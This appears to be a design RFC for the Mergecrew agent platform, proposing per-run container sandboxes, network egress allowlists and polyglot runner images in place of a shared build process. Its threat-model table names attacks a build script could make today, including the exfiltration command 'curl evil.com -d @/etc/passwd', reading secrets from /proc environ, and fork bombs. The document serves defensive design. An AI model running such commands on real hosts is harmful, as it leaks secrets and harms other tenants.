# Runner isolation & polyglot execution — design exploration

> **Status:** research / RFC. No code change implied by this document. It frames the design space for issues [#187](https://github.com/mergecrew/mergecrew/issues/187) (broader runner isolation) and [#188](https://github.com/mergecrew/mergecrew/issues/188) (egress allowlist scope), and proposes a phased path forward.

> **Tenancy note.** After [ADR-0002](../adrs/0002-per-org-runner-profile.md), `RUNNER_SANDBOX` no longer selects "the runner" for the whole deployment — it configures the **instance-builtin** runner profile, which only orgs in the trusted-org allowlist (ADR-0006) can use. Other orgs bring their own runner.

## 1. Why this doc exists

Today the runner is a **single shared Node.js process** per host. Every step from every org/project runs inside that one process, on the same host filesystem, with the same network identity, and with whatever runtimes happen to be baked into the image (`apps/runner/Dockerfile`).

Two pressures are pushing on this model at the same time:

1. **Security.** Co-tenancy in a single process is the model we explicitly flagged as a known gap in `docs/02-architecture/11-security.md` (§ "Code execution sandboxing", § "Egress allowlist scope"). The current text says, verbatim, that the per-project egress allowlist is "a soft control" because a build script the agent commits and runs can `curl` anywhere reachable from the host.
2. **Polyglot.** `packages/skills/src/stock/build.ts:5-10` allowlists exactly **10 commands** — `npm pnpm yarn node tsc tsx eslint prettier jest vitest playwright`. That is "JS/TS, period". Mergecrew cannot today run a project that is Java, Python, Go, Ruby, .NET, Rust, PHP, or anything else — not because the agent can't write the code, but because the runner has no way to invoke `mvn`, `pytest`, `go test`, etc., and no host on which they would even be installed.

These pressures point at the same change: **the unit of execution should be a per-run sandbox with a per-project image, not a shared process on a shared host.**

This document does not propose code. It surveys the design space, names the tradeoffs, and recommends a phased target.

## 2. Where we are today (factual recap)

Source files referenced are current as of writing; verify before quoting.

- **Runner process:** `apps/runner/src/main.ts` — one BullMQ `runner.step` worker, `RUNNER_CONCURRENCY` (default 4) parallel steps in-process.
- **Workspace:** `apps/runner/src/workspace.ts:14` — `/var/mergecrew/work/{run_id}/` (or `$TMPDIR/mergecrew-work/{run_id}/` in dev), 0700, cloned by the first step, GC'd by `runner.workspace-cleanup` on terminal state.
- **Build commands:** `packages/skills/src/stock/build.ts` — `execa(cmd, args, { cwd: workspacePath, env: { ...process.env, CI: 'true' }, timeout: 600_000 })`. Notice `...process.env` — every project's build inherits the runner process's environment.
- **Egress:** `packages/skills/src/egress-policy.ts` enforces the per-project allowlist for **HTTP-bound skills only** (`web.fetch_url` etc. and custom HTTPS skills). Shell-based skills bypass it.
- **Network namespace / cgroup limits:** not enforced by OSS code. Documented as operator-supplied.
- **Runtime catalog:** whatever is in the runner image. Currently Node only.

So the "isolation surface" today is:
- **Per-run filesystem dir** — implemented.
- **Per-step wall clock + abort signal** — implemented.
- **`npm install --ignore-scripts`** — implemented as a default.
- **Everything else** (network, env, CPU/mem, process tree, fs outside the workspace, kernel surface) — shared.

## 3. Threat model deltas if we stay on the shared-process model

Concretely, what a misbehaving step can do **today**:

| Attack | Possible today? | Why |
|---|---|---|
| Read another org's workspace dir | Yes (if path is guessed) | All `/var/mergecrew/work/*` are world-readable to the runner process; the runner is multi-tenant. |
| Read provider/BYOK secrets | Yes (in-memory) | The runner decrypts secrets in-process. A malicious build script in the same process tree can read `/proc/self/environ`, attach a debugger, scan memory, or `cat /proc/<runner-pid>/environ`. |
| Read AWS / GitHub App credentials | Yes | Host IAM role + GitHub App private key are reachable from any subprocess. |
| Exfiltrate via shell | Yes | `curl evil.com -d @/etc/passwd` from `build.run_unit_tests` is not blocked. |
| Persist beyond the step | Yes | `nohup` / `disown` / writing to `/tmp` outside the workspace dir / cron entries (where reachable). |
| DoS the runner host | Yes | Fork bomb, fill `/tmp`, exhaust file descriptors, infinite-loop tests pegging all 4 worker slots. |
| Cross-tenant timing/cache attacks | Yes | Shared filesystem cache, shared DNS resolver cache, shared package manager caches. |

Layer 5 of the multi-tenancy doc ("runner workspace isolation") is the layer that's currently weakest. Layers 1–4 (RLS, Nest context, repo helpers, outbound calls) are doing real work; layer 5 is doing the minimum.

## 4. Requirements for the next runner model

Drawn from the threat table above, the polyglot need, and the OSS positioning (`feedback_no_paid_services.md`, `feedback_battle_tested_over_bespoke.md`):

**Must-haves.**

1. **Per-run process & filesystem isolation.** A step's processes cannot see, signal, or read another run's processes, files, or memory.
2. **Per-run network identity.** Each run gets its own egress policy decision point. The decision must apply to **all** outbound traffic, not just Node-level HTTP skills. This is the hard fix for #188.
3. **Per-run resource bound.** CPU, memory, pids, disk write quota, wall clock — all bounded per run.
4. **Polyglot runtime catalog.** A project declares its stack and the runner provides a working toolchain (compilers, package managers, test runners) for it.
5. **Self-hostable on commodity infra.** Single VM with Docker. A k8s cluster. AWS Fargate. No paid SaaS in the path.
6. **Backwards-compatible step contract.** The runtime change is below the agent loop; agents, skills, and orchestrator messages are unchanged.

**Should-haves.**

7. **BYO image.** A project can point at any OCI image and we will run inside it.
8. **Project-supplied setup script.** Pre-step commands to install tools, restore caches, prime fixtures.
9. **Cache reuse without leaks.** Dependency caches (npm, pip, mvn, gradle, cargo) shared across runs in the same project without crossing org boundaries.
10. **Reasonable cold-start.** ≤ 5s typical step startup overhead; ≤ 30s for cold image pull.

**Won't-do in this iteration.**

- Browser sandboxing for `web.fetch_*` — same isolation primitive will cover it later but the policy work is its own thing.
- GPU-backed runners.
- Per-tenant dedicated host. (V3 enterprise concern, per `docs/04-roadmap.md`.)

## 5. Design space

Four mostly-independent axes. We pick one option per axis.

### 5.1 Isolation primitive — *how* the sandbox is enforced

| Option | What it is | Strength | Cost | Notes |
|---|---|---|---|---|
| **Plain Linux process** (status quo) | Just `execa` | None beyond user perms | $0 | What we have. Insufficient. |
| **Rootless Docker / Podman** | OCI container per run, no daemon root | User-namespaced, cgroup v2, network namespace | Cheap (~100ms cold) | The pragmatic default for self-hosters. Podman is daemonless. |
| **Sysbox** ([nestybox/sysbox](https://github.com/nestybox/sysbox)) | Drop-in OCI runtime; runs systemd / Docker-in-Docker safely | Strong: user-ns by default, no privileged needed | Cheap | Lets agents `docker build` inside a runner without giving them the host socket. OSS, Apache-2.0. |
| **gVisor** ([google/gvisor](https://github.com/google/gvisor)) | Userspace kernel intercepts syscalls | Very strong (syscall surface reduced ~10×) | 10–30% perf hit on syscall-heavy workloads | Used by GKE Sandbox, Cloud Run. Drop-in `--runtime=runsc` for Docker. |
| **Kata Containers** ([kata-containers](https://github.com/kata-containers/kata-containers)) | Each container in a lightweight VM (cloud-hypervisor or QEMU) | Hardware-virt isolation | Heavier (~500ms–2s boot) | Overkill unless we need kernel-level isolation. |
| **Firecracker microVMs** ([firecracker-microvm](https://github.com/firecracker-microvm/firecracker)) | KVM microVM, ~125ms boot, snapshottable | Hardware-virt | Significant ops surface | Powers Fly.io Machines and AWS Lambda. Snapshots are a real differentiator for cold start. |
| **AWS Fargate task per run** | One ECS task per run | Hardware-virt, AWS-managed | $$$ per-run + 30–60s cold start | Aligns with the existing AWS posture but is the slowest cold start and the most expensive per-run. |
| **k8s Pod per run** | Jobs API on an existing cluster | Strong if NetworkPolicy + PSA configured | Cluster ops cost | A reasonable target for operators who already run k8s. |
| **E2B Sandboxes** ([e2b-dev/infra](https://github.com/e2b-dev/infra)) | Firecracker-based sandboxes purpose-built for AI agents | Strong + agent-aware API | Self-hosting the infra is non-trivial | Built explicitly for this exact problem class. OSS (Apache-2.0). |

**Recommendation: OCI container per run, with a pluggable container runtime.** Default to `runc` (vanilla Docker/Podman) for ease; let operators swap in `runsc` (gVisor) or `runsc-kvm`/`sysbox`/`kata` via a single env var. The OCI runtime spec is the seam, so the runner code is identical regardless of which runtime is configured.

Why not Firecracker / E2B directly: they are great, but they are a *substantially* larger operational lift than "any Linux box with Docker", and the OSS adoption goal (`project_public_oss_goal.md`) demands the simplest credible default. We can keep them as a documented advanced path.

### 5.2 Image strategy — *what* runs inside the sandbox

| Option | What | Pros | Cons |
|---|---|---|---|
| **Stock image catalog** (curated per stack) | `mergecrew/runner-node:20`, `runner-python:3.12`, `runner-java:21`, `runner-go:1.22`, `runner-polyglot:latest` | Predictable, fast pull, we control toolchain versions | Combinatorial explosion as stacks grow |
| **One fat polyglot image** | Single image with mise/asdf + every common runtime | One image to maintain | Multi-GB; long cold pulls; cache invalidation pain |
| **devcontainer.json** ([spec](https://containers.dev)) | Project ships a `.devcontainer/devcontainer.json` describing image + features | Existing standard; VS Code / Codespaces / GitHub use it; matches "low contributor ramp-up" | Building a devcontainer in-runner takes longer than pulling a prebuilt image |
| **Cloud Native Buildpacks** ([buildpacks.io](https://buildpacks.io)) | Heroku/Paketo-style: detect → build → produce OCI image | Zero-config for many stacks | Build-time heavy; not designed for ephemeral test runs |
| **Nixpacks** ([railwayapp/nixpacks](https://github.com/railwayapp/nixpacks)) | Railway's auto-detected Nix-backed builder | Excellent stack detection; reproducible | Niche; Nix knowledge surfaces in failure modes |
| **BYO Dockerfile / image ref** | Project points at an OCI ref | Maximum flexibility | We trust user-built images; supply-chain risk shifts to them |

**Recommendation: stock catalog + devcontainer.json + BYO ref, in that resolution order.**

```
project image resolution:
  1. mergecrew.yaml: runner.image: "ghcr.io/acme/ci:v2"   → BYO, used as-is
  2. .devcontainer/devcontainer.json in the repo          → built/cached
  3. mergecrew.yaml: runner.stack: "python:3.12"          → stock catalog lookup
  4. auto-detect (pyproject.toml, package.json, pom.xml,  → stock catalog
     go.mod, Gemfile, Cargo.toml, composer.json, …)
  5. fallback: mergecrew/runner-polyglot:lts              → stock fat image
```

Stack auto-detection is a 50-line file ("if this lockfile exists, use this image"). It covers the 80% case while the other rungs cover the long tail without us having to grow the catalog faster than we can.

devcontainer.json earns its slot because it's the closest thing to an industry standard for "what does this repo need to build" and it's the same format developers already use locally with VS Code. Adopting it means we benefit from existing community Features and prebuilds — no new format to invent or document.

### 5.3 Tooling install — *how* runtimes get into the sandbox

Once we pick an image, the agent will still occasionally need a runtime or tool the image doesn't ship. Three patterns:

- **mise** ([jdx/mise](https://github.com/jdx/mise)) or **asdf** in every stock image. `.tool-versions` / `.mise.toml` in the repo pins versions; the runner runs `mise install` once per workspace bootstrap. Battle-tested, polyglot, OSS.
- **A `setup` step in `mergecrew.yaml`.** Custom shell run **once per workspace**, before any agent step. Bounded by a wall clock and the same egress policy. Result is cached keyed by `(image_ref, setup_script_hash, lockfile_hash)`.
- **Dev container Features.** If we honor `devcontainer.json`, we get the existing Features ecosystem for free.

**Recommendation: all three, in priority `setup` script → devcontainer Features → mise as the catch-all.**

Concretely, project config grows a `runner` block:

```yaml
# mergecrew.yaml — proposed
runner:
  stack: "python:3.12"          # or `image:` for BYO
  setup:
    - "pip install -r requirements.txt"
    - "pip install -e .[dev]"
  cache:
    paths:
      - ~/.cache/pip
      - .pytest_cache
  egress:
    allow:
      - pypi.org
      - files.pythonhosted.org
      - github.com
  resources:
    cpu: 2
    memory: 4Gi
    timeout: 30m
```

### 5.4 Networking — *what* the sandbox can talk to

The hard part of #188. Three feasible patterns:

- **Network namespace + iptables/nftables egress allowlist.** Per-run netns; DROP everything except a small allowlist resolved from `egress.allow`. Cheap, native, host-level. The default for the Docker variant.
- **Sidecar HTTPS proxy** (mitmproxy, [envoyproxy/envoy](https://github.com/envoyproxy/envoy), [tinyproxy](https://tinyproxy.github.io), or a small Go proxy). All `HTTPS_PROXY`/`HTTP_PROXY` traffic out goes through the sidecar; non-proxied traffic is dropped. SNI inspection enforces host allowlist. Works around the "build script bypasses Node skill API" problem.
- **k8s NetworkPolicy / Cilium** for the k8s variant. Same end state, different config surface.

These are **complementary**: netns is the floor (drop unauthorized traffic); the proxy is the audit/logging layer (so we can show the user "your build tried to reach evil.com 4 times"). Same approach Codespaces and GitHub Actions hosted runners use internally.

**Recommendation: netns + nftables default-deny, with an opt-in egress proxy sidecar in v2.** DNS goes through a tightly-controlled resolver that returns NXDOMAIN for anything not on the allowlist — solves the "build script resolves a hostname not in our HTTP allowlist" hole without our needing to MITM TLS.

### 5.5 Caching & cold-start

Per-run sandboxes risk turning every step into a cold dependency install. Mitigations, smallest to largest:

- **Image registry pull-through cache** on the runner host. Free with most registries.
- **Per-project workspace volume** mounted into successive runs. Persists `.git`, `node_modules`, `__pycache__`. Tagged with `(org_id, project_id)` so it never crosses orgs. Garbage-collected on a TTL.
- **Per-project tool cache** for `~/.npm`, `~/.cache/pip`, `~/.m2`, `~/.gradle`, `~/.cargo`, `~/go/pkg/mod`, declared via `runner.cache.paths`.
- **Firecracker snapshot of a "freshly installed" sandbox** (longer-term). Cold-start drops from "container boot + npm install" to "restore from snapshot" — single-digit seconds.

The first three are achievable today on plain Docker. The snapshot path is only available if we adopt Firecracker / E2B.

## 6. What comparable systems do

Useful to see the same problem solved at scale.

| System | Isolation | Image strategy | Egress |
|---|---|---|---|
| **GitHub Actions hosted runner** | Ephemeral VM per job (Azure) | One fat image per OS | None (free egress) |
| **GitHub Codespaces** | Per-user container on Azure | `.devcontainer/devcontainer.json`, Features, prebuilds | None |
| **CircleCI** | Container per job or VM per job | `image:` per job step | Allowlist (paid tier) |
| **Replit** | Per-user Nix container | `replit.nix` | Allowlist + proxy |
| **Vercel / Netlify Build** | Container per build | Framework-detected base image | Build cache + outbound |
| **Fly.io Machines** | Firecracker microVM | Any OCI image | Per-machine network policy |
| **Modal** | Container per function call | Function-declared image | Egress controls |
| **E2B Sandboxes** | Firecracker microVM | Stock + BYO images | Per-sandbox network policy |
| **Daytona** | Per-workspace OCI container | devcontainer.json | Configurable |

Several patterns converge: **devcontainer.json as the project-side declaration, OCI image as the artifact, Firecracker as the "I need this faster and stronger" option.** That convergence is what we're proposing to follow.

## 7. Proposed architecture (target state)

```
┌──────────────────────────────────────────────────────────────────────┐
│  orchestrator                                                        │
│    enqueues runner.step{run_id, step_id, agent_ref, project_id, …}   │
└────────────────────┬─────────────────────────────────────────────────┘
                     │ BullMQ
                     ▼
┌──────────────────────────────────────────────────────────────────────┐
│  runner-supervisor   (was: apps/runner)                              │
│   - picks job from runner.step                                       │
│   - resolves project's image (catalog | devcontainer | BYO)          │
│   - resolves egress allowlist, resource caps, setup script           │
│   - decrypts step secrets, scoped to (purpose, run_id)               │
│   - launches a per-run sandbox via the SandboxDriver                 │
│   - streams stdout/stderr, model turns, tool calls back through      │
│     the existing eventlog                                            │
└────────────────────┬─────────────────────────────────────────────────┘
                     │ Sandbox API (start / exec / fs / kill)
                     ▼
┌──────────────────────────────────────────────────────────────────────┐
│  SandboxDriver  (pluggable)                                          │
│   ├─ docker        — default; rootless; OCI runtime configurable     │
│   ├─ kubernetes    — Jobs API; for operators on k8s                  │
│   ├─ fargate       — ECS task per run; for AWS-native operators      │
│   └─ firecracker   — advanced; via E2B-style host service            │
└────────────────────┬─────────────────────────────────────────────────┘
                     │ runs the per-run sandbox
                     ▼
┌──────────────────────────────────────────────────────────────────────┐
│  per-run sandbox                                                     │
│   - workspace mounted at /workspace                                  │
│   - per-project caches mounted read-write at $XDG_CACHE_HOME, etc.   │
│   - network ns, default-deny, allowlist resolver                     │
│   - cgroup limits (cpu, memory, pids, blkio)                         │
│   - agent step shells in via the SandboxDriver to run skills         │
└──────────────────────────────────────────────────────────────────────┘
```

Key design choices:

- **The runner process stops executing user shell commands directly.** It becomes a *supervisor* that drives a sandbox. This is the structural change that fixes #187 and gives #188 a meaningful enforcement point.
- **`SandboxDriver` is a thin interface** (`start`, `exec`, `read_file`, `write_file`, `kill`). The agent loop and `SkillExecutionContext` don't care which driver is behind it.
- **Build-class skills (`build.*`, `repo.git.*`) exec inside the sandbox.** That's the whole point — the egress allowlist now actually applies to them because traffic goes through the sandbox's network namespace.
- **Stock images live in `infra/images/`** as Dockerfiles, built in CI, published to `ghcr.io/mergecrew/runner-*`.
- **The Skill API doesn't change.** `SkillExecutionContext.workspacePath` becomes a path inside the sandbox; `execa` becomes "exec via the driver". Skill authors see no difference.
- **Step transcripts get one new field:** `sandbox: { driver, image, egress_blocked: [host…], resource_high_water: {cpu, mem} }`. Surfaced in the run digest.

## 8. Configuration surface (UI + yaml)

Per the `feedback_configurability_and_docs.md` guidance, the backend feature is only "done" once the UI and docs let a user actually pick it.

**In the project settings UI:**

1. **Stack picker** (auto-detected, override-able). Dropdown: Node 20 / Python 3.12 / Java 21 / Go 1.22 / Polyglot / Custom image / devcontainer.
2. **Custom image input** (when "Custom image" picked). OCI ref + optional pull credentials (BYO registry).
3. **Setup script** textarea.
4. **Resource caps** (CPU, memory, wall clock).
5. **Egress allowlist** (hostnames, with the existing UI).
6. **Cache paths** list.

**In `mergecrew.yaml`** (precedence over UI, with a UI badge "configured in repo"):

```yaml
runner:
  stack: "python:3.12"      # one of: node:20, python:3.12, java:21, go:1.22, polyglot, custom
  image: "ghcr.io/acme/ci:v2"     # when stack=custom
  setup: ["pip install -r requirements.txt"]
  cache:
    paths: ["~/.cache/pip", ".pytest_cache"]
  resources: { cpu: 2, memory: 4Gi, timeout: 30m }
  egress:
    allow: ["pypi.org", "files.pythonhosted.org", "github.com"]
```

**Docs that must ship with the feature:**

- `docs/03-infrastructure/22-runner-images.md` — what's in each stock image, how to build a custom one, the contract a custom image must meet (e.g., `git`, `bash`, `mise` present; `/workspace` writable; user `mergecrew` uid 1001).
- `docs/03-infrastructure/23-runner-network-policy.md` — how egress enforcement works, how to debug a blocked request, the difference between the netns and the proxy mode.
- Stack-specific cookbook entries (Python, Java, Go, Ruby, .NET) — each a 1-page "here's a real-world project, here's the `mergecrew.yaml` that runs it".

## 9. Phased rollout

Bias-to-shipping, each phase deliverable on its own:

**Phase 1 — Docker-per-run, JS-only parity (#187 core).**
- Introduce `SandboxDriver` interface, ship the `docker` driver.
- Stock image: `mergecrew/runner-node:20`. Functional parity with today.
- `runner.image` and `runner.resources` honored from `mergecrew.yaml`.
- `build.*` skills exec inside the sandbox. Egress allowlist applies (#188 hard fix).
- Operator opt-in via `RUNNER_SANDBOX=docker`; default stays at `process` for the first release.
- Cost: medium. Risk: medium — agent loop unchanged; the surface is the supervisor and the driver.

**Dogfood gate (#565).** Flipping the default from `process` to `docker` is gated on 14 unsupervised days of `mergecrew/mergecrew` itself running on the docker driver with no sandbox-attributable regressions. The metrics for that bake are emitted by the supervisor and the driver:

- `SANDBOX_STARTED` timeline event — payload includes `driver`, `image`, `coldStartMs`. Persisted, queryable from `timeline_events`.
- `sandbox.cold_start` pino event — same shape as above on the driver-side logger.
- `sandbox.oom_suspected` pino event — emitted by `DockerDriver` on exit-code 137, with `containerOomKilled` from `docker inspect` for confirmation.
- `egress.blocked` pino event — emitted by `runner-egress-proxy` for any outbound that the per-project allowlist rejects.

Run `pnpm dogfood:bake-report --flip-at <iso>` to print the comparison table (step pass rate, p50/p95 step latency, p50/p95 cold-start) for the 14-day windows before and after the flip. OOM kills and egress blocks live in pino-only logs by design (debug signals, not tenant-visible events) — paste those counts in from your log shipper before posting the report back on #565.

**Phase 2 — Polyglot stock catalog.**
- Add `runner-python`, `runner-java`, `runner-go`, `runner-polyglot` images.
- Stack auto-detection from lockfiles.
- mise installed in every stock image; `.tool-versions` honored.
- Per-stack cookbook docs.

**Phase 3 — devcontainer.json + BYO.**
- `.devcontainer/devcontainer.json` honored when present; built and cached.
- BYO image ref with optional pull credentials.
- Setup script + cache paths plumbed through the UI.

**Phase 4 — Egress proxy sidecar + DNS resolver.**
- Default-deny still applies; proxy adds visibility and per-domain-per-run audit.
- Surfaced as "blocked outbound" in the run digest.

**Phase 5 — Advanced drivers.**
- `kubernetes` driver (Jobs API) for self-hosters on k8s.
- `fargate` driver for AWS-native operators.
- `firecracker` (or E2B integration) for snapshot-based fast cold start.

Phases 1–3 are the "ships V1.x"; 4 and 5 are V2.

## 10. Open questions

- **Default in OSS distribution.** Should `RUNNER_SANDBOX` default to `docker` from day one, or remain `process` with an upgrade nudge? Defaulting to `docker` raises the installer's bar (needs a Docker socket); defaulting to `process` keeps the soft-control gap. Lean: ship phase 1 with `process` default + a prominent "your installation is using the unsandboxed runner" banner, flip to `docker` default in the next release.
- **Docker socket exposure on the host.** The supervisor needs to launch sandboxes — does that mean a Docker socket inside the supervisor container? Sysbox + rootless Docker is the cleanest answer; needs validation that it works on the operator's target distros.
- **Cost model.** A per-run container adds ~100–300ms of overhead and a few hundred MB of RAM per concurrent run. Worth modeling for the hosted tier; harmless for self-hosters at their scale.
- **What about Windows projects?** Out of scope for V1. Linux containers cover Node/Python/Java/Go/Ruby/Rust. .NET on Linux works. Windows-only stacks (legacy .NET Framework, MSBuild against Windows SDK) need a different host pool — defer to V3.
- **GPU.** Out of scope.
- **Skill-API impact.** `SkillExecutionContext.workspacePath` becomes a sandbox-internal path. Skills that hard-code host paths break. Audit and rewrite needed for `packages/skills/src/stock/*` — should be small in practice (only `build.ts` and `repo.ts` exec).
- **Test infra.** End-to-end tests today rely on `execa` in-process. The sandboxed path needs its own e2e coverage — probably as a new `apps/e2e-loop` scenario that asserts a deliberately misbehaving build script is contained.
- **Inception loop.** Mergecrew on Mergecrew already runs a Node project. Switching the runner under itself is a meaningful migration — phase 1 should ship behind an env flag and bake on dogfooding before becoming the default.

## 11. References

- Sandbox primitives: [Firecracker](https://github.com/firecracker-microvm/firecracker), [gVisor](https://github.com/google/gvisor), [Sysbox](https://github.com/nestybox/sysbox), [Kata Containers](https://github.com/kata-containers/kata-containers).
- Sandboxes for AI agents: [E2B](https://github.com/e2b-dev/infra), [Daytona](https://github.com/daytonaio/daytona).
- Image / build standards: [containers.dev (devcontainer.json)](https://containers.dev), [Cloud Native Buildpacks](https://buildpacks.io), [Nixpacks](https://github.com/railwayapp/nixpacks).
- Toolchain managers: [mise](https://github.com/jdx/mise), [asdf](https://github.com/asdf-vm/asdf).
- Egress: [Envoy](https://github.com/envoyproxy/envoy), [Cilium NetworkPolicy](https://github.com/cilium/cilium), [smallstep/step-ca](https://github.com/smallstep/certificates) (for the proxy variant later).
- Prior art in our docs: `docs/02-architecture/03-multi-tenancy.md` (§ Layer 5), `docs/02-architecture/11-security.md` (§ Code execution sandboxing, § Egress allowlist scope).
- Tracking issues: [#187](https://github.com/mergecrew/mergecrew/issues/187), [#188](https://github.com/mergecrew/mergecrew/issues/188).
